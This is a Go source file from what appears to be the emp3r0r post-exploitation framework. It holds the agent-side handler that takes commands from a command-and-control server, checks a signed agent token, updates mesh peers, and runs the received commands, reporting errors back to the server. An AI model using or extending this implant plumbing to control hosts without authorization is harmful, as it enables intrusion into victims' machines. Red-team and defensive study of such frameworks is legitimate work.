package handler

import (
	"fmt"
	"strings"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/mesh"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

// HandleC2Command dispatches commands received from the C2 server.
func HandleC2Command(cmdData *def.MsgTunData) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("HandleC2Command panic: %v", r)
		}
	}()

	// Handle AgentToken push from C2
	if cmdData.Tag == def.TagAgentToken {
		var tok def.AgentToken
		if err := cbor.Unmarshal(cmdData.Response, &tok); err != nil {
			logging.Errorf("HandleC2Command: AgentToken unmarshal: %v", err)
			return
		}
		// Verify signature
		payload := fmt.Sprintf("%s%s%s%d", tok.AgentID, tok.IP, tok.Capability, tok.ExpiresAt)
		valid, err := transport.VerifySignatureWithCA([]byte(payload), tok.Signature)
		if err != nil || !valid {
			logging.Errorf("HandleC2Command: AgentToken signature invalid: %v", err)
			return
		}
		common.RuntimeConfig.MyAgentToken = &tok
		logging.Successf("AgentToken received (cap=%s, expires=%v)", tok.Capability, time.Unix(tok.ExpiresAt, 0))
		// Re-broadcast gossip NodeMeta immediately so peers in the mesh cluster
		// see our updated token without waiting for the next push-pull cycle.
		mesh.UpdateGossipMeta()
		return
	}

	job_id := cmdData.JobID
	cmd_argc := len(cmdData.CmdSlice)
	cmdSlice := append(cmdData.CmdSlice, []string{"--job_id", job_id}...)
	if cmd_argc < 0 {
		logging.Warningf("Invalid command: %v", cmdSlice)
	}
	logging.Debugf("Received command: %v", cmdSlice)
	command := CoreCommands()
	is_builtin := strings.HasPrefix(cmdSlice[0], "!")
	if is_builtin {
		command = C2Commands()
	}
	command.SetArgs(cmdSlice)
	command.SetOut(logging.Writer())
	command.SetErr(logging.Writer())
	err := command.Execute()
	if err != nil {
		c2transport.NotifyC2(command, "Error: %v", err)
	}
}
